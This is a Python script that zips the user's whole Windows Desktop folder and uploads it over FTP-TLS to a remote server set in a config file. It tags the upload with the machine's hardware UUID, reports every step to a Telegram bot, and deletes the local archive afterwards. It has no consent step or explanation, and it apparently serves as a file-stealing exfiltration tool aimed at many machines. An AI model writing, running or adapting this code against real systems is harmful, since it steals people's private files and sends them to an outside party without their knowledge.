from shutil import make_archive
from os import environ, SEEK_END, remove
from subprocess import check_output
from requests import post
from ftplib import FTP_TLS, FTP
from pathlib import Path
from tqdm.contrib.telegram import tqdm_telegram
from datetime import datetime
from pytz import timezone

from config import config


def send_message(status: str, text: str) -> None:
    post(
        url = config.bot.url.format(
            token = config.bot.token,
            method = "sendMessage"
        ),
        json = {
            "chat_id": config.bot.chat_id,
            "text": "[{status}] {text}".format(
                status = status,
                text = text
            ),
            "parse_mode": "HTML"
        }
    )


class Status:
    START: str = "⭐️"
    ARCHIVE_CREATED: str = "🕹"
    UPLOADING: str = "💭"
    PERCENT: str = "💠"
    SUCCESS: str = "✅"
    UNSUCCESS: str = "❌"


machine_info: str = check_output(
    args = "wmic csproduct get uuid"
).decode().split("\n")[1].strip().replace("-", "_")


send_message(
    status = Status.START,
    text = "#{machine_info} creating archive ...".format(
        machine_info = machine_info
    )
)


archive_name: str = make_archive(
    base_name = "desktop",
    format = 'zip',
    root_dir = "C:{path}\\\Desktop".format(
        path = environ.get('HOMEPATH')
    )
)


send_message(
    status = Status.ARCHIVE_CREATED,
    text = "#{machine_info} archive created".format(
        machine_info = machine_info
    )
)


file_path: Path = Path(
    archive_name
)

class CustomFTP_TLS(FTP_TLS):
    def ntransfercmd(self, cmd, rest=None):
        sock, size = FTP.ntransfercmd(
            self = self,
            cmd = cmd,
            rest = rest
        )

        if self._prot_p:
            sock = self.context.wrap_socket(
                sock = sock,
                server_hostname = self.host,
                session = self.sock.session
            )

        return sock, size


class FTPUploadTracker:
    BLOCK_SIZE: int = 4096

    def __init__(self, total_size: int) -> None:
        self.progress_bar: tqdm_telegram = tqdm_telegram(
            total = total_size,
            mininterval = 0.68,
            unit = "iB",
            unit_scale = True,
            token = config.bot.token,
            chat_id = config.bot.chat_id
        )

    def handle(self, block: bytes) -> None:
        self.progress_bar.update(
            n = len(block)
        )

    def close(self) -> None:
        try:
            self.progress_bar.close()
        except:
            pass


with CustomFTP_TLS(
    host = config.ftp.host,
    user = config.ftp.user,
    passwd = config.ftp.password
) as ftp, open(file_path, "rb") as file:
    ftp.set_pasv(True)
    ftp.prot_p()

    file.seek(0, SEEK_END)
    size: int = int(file.tell())
    file.seek(0)

    upload_filename: str = "{machine_info} {formatted_time}.zip".format(
        machine_info = machine_info,
        formatted_time = datetime.now(
            tz = timezone(
                zone = "Asia/Almaty"
            )
        ).strftime("%d.%m.%Y %H:%M:%S")
    )

    send_message(
        status = Status.UPLOADING,
        text = "#{machine_info} uploading as <code>{upload_filename}</code> ...".format(
            machine_info = machine_info,
            upload_filename = upload_filename
        )
    )

    upload_tracker: FTPUploadTracker = FTPUploadTracker(
        total_size = size
    )

    try:
        ftp.storbinary(
            cmd = "STOR {upload_filename}".format(
                upload_filename = upload_filename
            ),
            fp = file,
            blocksize = upload_tracker.BLOCK_SIZE,
            callback = upload_tracker.handle
        )

    except Exception as ex:
        send_message(
            status = Status.UNSUCCESS,
            text = "#{machine_info} error while uploading <code>{upload_filename}</code> - {exception}".format(
                machine_info = machine_info,
                upload_filename = upload_filename,
                exception = str(ex)
            )
        )

        exit(1)

    upload_tracker.close()

    send_message(
        status = Status.SUCCESS,
        text = "#{machine_info} <code>{upload_filename}</code> uploaded".format(
            machine_info = machine_info,
            upload_filename = upload_filename
        )
    )


remove(
    path = file_path
)
